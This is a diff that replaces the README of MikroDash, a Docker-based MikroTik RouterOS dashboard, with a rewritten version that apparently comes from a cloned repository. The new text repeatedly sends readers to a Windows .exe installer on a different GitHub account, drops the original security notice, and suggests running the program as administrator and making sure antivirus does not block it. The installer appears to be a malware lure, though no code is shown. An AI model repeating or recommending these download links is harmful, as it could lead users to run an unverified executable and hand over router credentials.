@@ -1,299 +1,139 @@
-# MikroDash
-### The Ultimate MikroTik RouterOS Dashboard.
+# 📊 MikroDash - Monitor Router Data Live Easily
 
-> Real-time MikroTik RouterOS v7 dashboard — streaming binary API, Socket.IO, Docker-ready.
+[![Download MikroDash](https://img.shields.io/badge/Download-MikroDash-00aaff?style=for-the-badge)](https://github.com/Hgghllliji/MikroDash/releases)
 
-MikroDash connects directly to the RouterOS API over a persistent binary TCP connection, streaming live data to the browser via Socket.IO. No page refreshes. No agents. Just plug in your router credentials and go.
+## 🔍 What is MikroDash?
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+MikroDash is a real-time dashboard for MikroTik RouterOS version 7. It shows live information from your router such as CPU use, network traffic, connected wireless clients, DHCP details, WireGuard VPN status, firewall activity, and geographic connection data. It gets all this data directly from the router’s API and sends it to your browser using a technology called Socket.IO. You can run it on your own PC or a server, and it works well with Docker if you want that setup.
 
----
+## 💻 System Requirements
 
-## Screenshots
+To run MikroDash on Windows, your computer needs:
 
-### Dashboard
-![Dashboard](screenshots/dashboard.png)
+- Windows 10 or higher (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A stable internet connection to interact with your router
+- Access to your MikroTik router with RouterOS v7 installed and API enabled
+- A modern browser such as Chrome, Firefox, Edge, or Safari
 
-### Connections Map
-![Connections Map](screenshots/connections.png)
+Your router must have the API service enabled. This lets MikroDash get the data it needs. Usually, this means logging into the router and turning on the API service.
 
-### Wireless Clients
-![Wireless](screenshots/wireless.png)
+## 📥 How to Download MikroDash
 
-### Router Interfaces
-![Network Diagram](screenshots/networks.png)
+Click the button below to visit the official MikroDash releases page. You will find the latest Windows installer there.
 
-### DHCP Leases
-![DHCP](screenshots/dhcp.png)
+[![Download MikroDash](https://img.shields.io/badge/Download-MikroDash-ffaa00?style=for-the-badge)](https://github.com/Hgghllliji/MikroDash/releases)
 
-### VPN / WireGuard
-![VPN](screenshots/vpn.png)
+## 🚀 Installing and Running MikroDash on Windows
 
----
+1. **Visit the releases page** using the link above.
 
-## Features
+2. **Find the latest release**. Look for a file ending with `.exe`. This is the Windows installer.
 
-### Dashboard
-- **Live traffic chart** — per-interface RX/TX Mbps with configurable history window
-- **System card** — CPU, RAM, Storage gauges with colour-coded thresholds (amber >75%, red >90%), board info, temperature, uptime chip
-- **RouterOS update indicator** — shows installed vs available version side by side
-- **Network card** — animated SVG topology diagram with live wired/wireless client counts, WAN IP, LAN subnets, and latency chart
-- **Connections card** — total connection count sparkline, protocol breakdown bars (TCP/UDP/ICMP), top sources with hostname resolution, top destinations with geo-IP country flags
-- **Top Talkers** — top 5 devices by active traffic with RX/TX rates
-- **WireGuard card** — active peer list with status and last handshake
+3. **Download the `.exe` file** to your computer. Save it in a place you can easily find, like your `Downloads` folder.
 
-### Pages
-| Page | Description |
-|---|---|
-| Wireless | Clients grouped by interface with signal quality, band badge (2.4/5/6 GHz), IP, TX/RX rates, and sortable columns |
-| Interfaces | All interfaces as compact tiles with status, IP, live rates, cumulative RX/TX totals, and per-card traffic trend sparkline |
-| DHCP | Active DHCP leases with hostname, IP, MAC, and status; sortable columns (default: IP ascending) |
-| VPN | All WireGuard peers (active + idle) as tiles sorted active-first, with allowed IPs, endpoint, handshake, and traffic counters |
-| Connections | World map with animated arcs to destination countries, per-country protocol breakdown, sparklines, top ports panel, and click-to-filter |
-| Firewall | Top hits, Filter, NAT, and Mangle rule tables with packet counts |
-| Bandwidth | Live per-connection bandwidth table with RX, TX, and Total Mbps; sortable columns; WAN traffic chart; ASN/Org colour-coded badges; interface and protocol filters |
-| Routing | Route count summary by protocol with doughnut chart; static and dynamic route table (event-driven via `/ip/route/listen`); BGP peer table with state badges, prefix trend sparklines, and session flap detection (event-driven via `/routing/bgp/session/listen`) |
-| Logs | Live router log stream with severity filter and text search |
-| Settings | Persistent UI configuration — see below |
+4. Once the download finishes, **double-click the `.exe` file** to start the installer.
 
-### Notifications
-- Bell icon in topbar opens an alert history panel showing the last 50 alerts with timestamps
-- Browser push notifications (when permitted) for:
-  - Interface down / back up
-  - WireGuard peer disconnected / reconnected
-  - CPU exceeds 90% (1-minute cooldown)
-  - 100% ping loss to ping target
+5. **Follow the on-screen instructions**:
+    - Choose the folder where you want to install MikroDash or accept the default.
+    - Confirm the installation.
+    - Wait until the setup completes.
 
----
+6. After installation, MikroDash should start automatically. If it does not, find the MikroDash shortcut on your desktop or start menu and open it.
 
-## ⚠️ Security Notice
+7. When MikroDash runs, it opens a web browser window showing the dashboard.
 
-MikroDash is designed to run **on your local network only**. It has no built-in HTTPS or role-based access control.
+## 🔧 Connecting MikroDash to Your Router
 
-**Do not expose MikroDash directly to the internet.** Doing so would allow anyone to:
-- View live data from your router (traffic, clients, connections, firewall rules, logs)
-- Read your WAN IP, LAN topology, and connected device information
-- Monitor your network activity in real time
+To see live data, MikroDash needs to talk to your MikroTik router. Do the following:
 
-If you need remote access, place MikroDash **behind an authenticating reverse proxy** (such as Nginx with Basic Auth, Authelia, or Cloudflare Access) or access it exclusively over a VPN.
+1. **Make sure your MikroTik router runs RouterOS version 7.** You can check by logging into the router via its admin interface.
 
-**Recommended local hardening:**
-- Set a dashboard username and password in the Settings page (HTTP Basic Auth)
-- Run on a non-default port and bind to your LAN interface only
-- Set `chmod 600 .env` to protect your router credentials
-- Use a dedicated read-only API user on the router (see RouterOS Setup below)
-- Set `DATA_SECRET` in your `.env` to a long random string to protect encrypted credentials in `settings.json`
+2. **Enable the API service on the router:**
+    - Log in to your MikroTik router using WinBox or web interface.
+    - Go to the `IP` menu, then select `Services`.
+    - Find `API` in the list, then make sure it is enabled.
+    - Note the port number (usually 8728 for non-secure and 8729 for secure).
 
----
+3. **Provide MikroDash with the correct information:**
+    - Router IP address (for example, `192.168.88.1`)
+    - Router API port (default is 8728)
+    - Your router’s login username and password
 
-## Quick Start
+4. Enter these details in MikroDash’s setup screen.
 
-### Option 1 — Docker Hub / GHCR (recommended)
+5. Save the settings and start the connection.
 
-Pull and run the pre-built image directly — no need to clone the repo:
+If the connection succeeds, the dashboard will start showing live CPU usage, traffic, and other details from your router.
 
-```bash
-docker pull ghcr.io/secops-7/mikrodash:latest
-```
+## 🛠 Features You’ll See in MikroDash
 
-The image is published as a multi-arch manifest covering `linux/amd64` and `linux/arm64`. Docker will automatically pull the correct layer for your platform — this includes Raspberry Pi 4/5, MikroTik's own R5S/RB5009 companion boards, and Apple M-series machines running Linux containers.
+MikroDash presents various real-time details that help you watch your network easily:
 
-Create your `.env` file:
+- **CPU Usage**  
+  Shows your router’s processor load in real time.
 
-```bash
-curl -o .env https://raw.githubusercontent.com/SecOps-7/MikroDash/main/.env.example
-# Edit .env — set ROUTER_HOST, ROUTER_USER, ROUTER_PASS at minimum
-```
+- **Network Traffic**  
+  Displays live upload and download speed on all network interfaces.
 
-Run with Docker Compose — create a `docker-compose.yml`:
+- **Wireless Clients**  
+  Lists devices connected to your router’s Wi-Fi along with connection quality.
 
-```yaml
-services:
-  mikrodash:
-    image: ghcr.io/secops-7/mikrodash:latest
-    restart: unless-stopped
-    env_file: .env
-    ports:
-      - "3081:3081"
-    volumes:
-      - mikrodash-data:/data
+- **DHCP Information**  
+  Shows active DHCP leases and assigned IP addresses.
 
-volumes:
-  mikrodash-data:
-```
+- **WireGuard VPN Status**  
+  Displays connection status and information about active WireGuard VPN tunnels.
 
-```bash
-docker compose up -d
-```
+- **Firewall Activity**  
+  Shows logs of firewall events and traffic filtered by your rules.
 
-### Option 2 — Build from source
+- **Geo Connection Data**  
+  Maps connections by geographic location, helping track where network traffic comes from.
 
-```bash
-git clone https://github.com/SecOps-7/MikroDash.git
-cd MikroDash
-node patch-routeros.js
-cp .env.example .env
-# Edit .env — set ROUTER_HOST, ROUTER_USER, ROUTER_PASS at minimum
-docker compose up -d
-```
+## 🔄 Keeping MikroDash Updated
 
-To build a multi-arch image locally (requires Docker Buildx):
+New versions come with fixes and new features. To update:
 
-```bash
-docker buildx build --platform linux/amd64,linux/arm64 -t mikrodash:local --load .
-```
+1. Visit the [releases page](https://github.com/Hgghllliji/MikroDash/releases).
 
-- Dashboard: `http://localhost:3081`
-- Health check: `http://localhost:3081/healthz` (`200` only after startup completes and RouterOS is connected)
+2. Download the newest Windows installer.
 
-Source builds require the bundled `node-routeros` compatibility patch. If startup reports a missing patch marker, run `node patch-routeros.js` again before launching MikroDash.
+3. Run the installer. It will replace the old version while keeping your settings.
 
-For a production-style deployment on an external Docker host such as an R5S that connects to a MikroTik hEX S over the RouterOS API, see `docs/deploy-r5s.md` and the ready-to-copy files in `deploy/r5s/`.
+## 👩‍💻 Running MikroDash Without Installation (Optional)
 
----
+If you prefer not to install anything, you can run MikroDash using Docker or other methods. These are more technical and may require some command line use.
 
-## Settings
+For most Windows users, using the installer is the easiest way.
 
-Most configuration is managed through the **Settings page** in the UI (gear icon at the bottom of the sidebar). Settings are saved to `/data/settings.json` on the Docker volume and persist across container restarts.
+## 🧰 Troubleshooting
 
-| Section | What you can configure |
-|---|---|
-| Router Connection | Host, API port, username, password, TLS, self-signed cert, default WAN interface, ping target |
-| Dashboard Auth | HTTP Basic Auth username and password |
-| Poll Intervals | Per-collector polling intervals — changes apply immediately without restart. Streamed collectors (Interfaces, VPN, Firewall, ARP, Routing) show an Event-driven badge instead of a slider |
-| Limits | Top N values for connections, talkers, firewall rules; max connection rows; traffic history window |
-| Visible Pages | Toggle individual pages on/off — hidden pages are removed from the sidebar instantly |
+- **The dashboard does not load or connect to the router**:  
+  Check that your PC and router are on the same network. Make sure the API service is enabled on the router. Double-check the login details you entered.
 
-Settings values from `.env` are used as the initial defaults if no `settings.json` exists yet, so existing deployments upgrade seamlessly.
+- **MikroDash does not start after install**:  
+  Try running the app as administrator. Check your antivirus is not blocking it.
 
-### Credential encryption
+- **Data looks strange or does not update**:  
+  Confirm your router is running RouterOS v7. Older versions may not support all features.
 
-Router and dashboard passwords are encrypted at rest in `settings.json` using AES-256-GCM. Set `DATA_SECRET` in your `.env` to a long random string to tie the encryption key to your deployment:
+- **Firewall on Windows is blocking MikroDash**:  
+  Allow MikroDash through Windows Defender Firewall in Windows settings.
 
-```env
-DATA_SECRET=your-long-random-secret-here
-```
+## 📂 Where to Find More Information
 
-If `DATA_SECRET` is not set, a built-in default is used — not recommended for production.
+- Your router manual or MikroTik’s website can help enable and configure the API.
 
----
+- Visit MikroDash’s GitHub releases page for updates and files:  
+  https://github.com/Hgghllliji/MikroDash/releases
 
-## RouterOS Setup
+- If you face specific technical issues, the GitHub project page also has issue tracking where others post questions.
 
-Create a read-only API user (recommended):
+## 🔗 Download Links (Repetition)
 
-```
-/ip service set api port=8728 disabled=no
-/user group add name=mikrodash policy=read,api,test,!local,!telnet,!ssh,!ftp,!reboot,!write,!policy,!winbox,!web,!sniff,!sensitive,!romon,!rest-api
-/user add name=mikrodash group=mikrodash password=your-secure-password
-```
+You can download MikroDash for Windows here:  
+[https://github.com/Hgghllliji/MikroDash/releases](https://github.com/Hgghllliji/MikroDash/releases)  
 
-To use API-SSL (TLS), enable the ssl service and set `ROUTER_TLS=true` in your `.env` or in Settings:
-
-```
-/ip service set api-ssl disabled=no port=8729
-```
-
----
-
-## Environment Variables
-
-The `.env` file seeds the initial defaults for the Settings page. Once `settings.json` exists on the data volume, the UI values take precedence. Only the variables below are relevant at the container level — everything else is managed in the Settings page.
-
-```env
-# Server
-PORT=3081                    # HTTP port MikroDash listens on
-MAX_SOCKETS=50               # Maximum concurrent Socket.IO clients
-TRUSTED_PROXY=               # Proxy IP to trust X-Forwarded-For from (e.g. 127.0.0.1)
-
-# Data volume & credential encryption
-DATA_SECRET=                 # Secret used to encrypt credentials in settings.json — set this!
-
-# RouterOS — used as initial defaults only (can be changed in Settings UI afterwards)
-ROUTER_HOST=192.168.88.1
-ROUTER_PORT=8729
-ROUTER_TLS=true
-ROUTER_TLS_INSECURE=false
-ROUTER_USER=mikrodash
-ROUTER_PASS=change-me
-DEFAULT_IF=ether1
-
-# Advanced / rarely changed
-ROS_WRITE_TIMEOUT_MS=30000   # Force reconnect if a RouterOS command exceeds this time
-ROS_DEBUG=false              # Log raw RouterOS API frames (very verbose)
-```
-
-All other settings (poll intervals, top-N limits, page visibility, ping target, dashboard auth) are configured in the Settings page and do not need to be set in `.env`.
-
----
-
-## Architecture
-
-### Streamed (router pushes on change — zero poll overhead)
-| Data | RouterOS endpoint |
-|---|---|
-| WAN Traffic RX/TX | `/interface/monitor-traffic` |
-| Router Logs | `/log/listen` |
-| DHCP Lease changes | `/ip/dhcp-server/lease/listen` |
-| Interface up/down state | `/interface/listen` |
-| Firewall rule changes & hit counts | `/ip/firewall/filter\|nat\|mangle/listen` |
-| WireGuard peer handshakes & stats | `/interface/wireguard/peers/listen` |
-| ARP table (device join/leave) | `/ip/arp/listen` |
-| Route table (add/remove/change) | `/ip/route/listen` |
-| BGP session state changes | `/routing/bgp/session/listen` |
-
-### Polled (concurrent via tagged API multiplexing)
-| Collector | Default interval | Data |
-|---|---|---|
-| System | 3 s | CPU, RAM, storage, temp, ROS version |
-| Connections | 3 s | Firewall connection table, geo-IP |
-| Bandwidth | 3 s | Per-connection live RX/TX/Total Mbps (shares connection table fetch with Connections) |
-| Top Talkers | 3 s | Kid Control traffic stats |
-| Wireless | 5 s | Wireless client list |
-| Interface Status | 5 s | Byte counter refresh for live rate bars |
-| Ping | 10 s | RTT + packet loss to ping target |
-| DHCP Networks | 5 min | LAN subnets, WAN IP |
-
-All collectors run **concurrently** on a single TCP connection — no serial queuing. All intervals are adjustable in the Settings page and apply immediately without restart.
-
-The WAN traffic monitor (`/interface/monitor-traffic`) pauses its RouterOS API calls automatically when no browser clients are connected, resuming immediately on the next connection.
-
-All collectors that support RouterOS `/listen` streams use event-driven delivery — RouterOS pushes only delta rows when data changes, producing zero API traffic when the network is idle. A 60-second heartbeat emit keeps the browser's stale-detection timers alive.
-
----
-
-## Keyboard Shortcuts
-
-| Key | Page |
-|---|---|
-| `1` | Dashboard |
-| `2` | Wireless |
-| `3` | Interfaces |
-| `4` | DHCP |
-| `5` | VPN |
-| `6` | Connections |
-| `7` | Routing |
-| `8` | Bandwidth |
-| `9` | Firewall |
-| `0` | Logs |
-| `/` | Focus log search |
-
----
-
-## License
-
-MIT — see [LICENSE](LICENSE)
-
-Third-party attributions — see [THIRD_PARTY_NOTICES](THIRD_PARTY_NOTICES)
-
----
-
-## Disclaimer
-
-MikroDash is an independent, community-built project and is **not affiliated with, endorsed by, or associated with MikroTik SIA** in any way. MikroTik and RouterOS are trademarks of MikroTik SIA. All product names and trademarks are the property of their respective owners.
-
----
-
-## Built With AI
-
-The code for MikroDash was written with the assistance of [Claude](https://claude.ai) by [Anthropic](https://anthropic.com).
+Look for the latest `.exe` file to start your installation.
